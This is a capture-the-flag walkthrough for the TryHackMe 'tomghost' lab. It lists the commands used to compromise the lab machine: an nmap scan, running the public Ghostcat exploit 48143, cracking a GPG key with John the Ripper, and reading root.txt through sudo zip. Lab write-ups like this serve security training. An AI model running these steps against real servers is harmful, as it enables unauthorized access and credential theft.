---
description: https://tryhackme.com/room/tomghost
---

# tomghost

## :writing\_hand: Solution

### Compromise this machine and obtain user.txt

```
nmap 10.10.188.102
```

![](<../../.gitbook/assets/Screenshot from 2020-09-29 09-31-01.png>)

```
searchsploit ghostcat
searchsploit -m 48143
python 48143.py 10.10.188.102 
```

![](<../../.gitbook/assets/Screenshot from 2020-09-29 09-45-17.png>)

![](<../../.gitbook/assets/Screenshot from 2020-09-29 09-48-12.png>)

```
ssh skyfuck@10.10.188.102
$ ls -lA
$ gpg --allow-secret-key-import --import tryhackme.asc
$ gpg --list-secret-keys
```

![](<../../.gitbook/assets/Screenshot from 2020-09-29 10-24-45.png>)

```
vim tryhackme.asc
gpg2john tryhackme.asc > gpg.txt
john --wordlist=/usr/share/wordlists/rockyou.txt gpg.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-29 10-08-45.png>)

```
$ gpg -d credential.pgp
$ su - merlin
$ cat user.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-29 10-09-30.png>)

![](<../../.gitbook/assets/Screenshot from 2020-09-29 10-10-36.png>)

### Escalate privileges and obtain root.txt

```
$ sudo -l
$ sudo /usr/bin/zip root.zip /root/root.txt
$ unzip -c root.zip
```

![](<../../.gitbook/assets/Screenshot from 2020-09-29 10-20-39.png>)

## Support Material

{% embed url="https://www.exploit-db.com/exploits/48143" %}

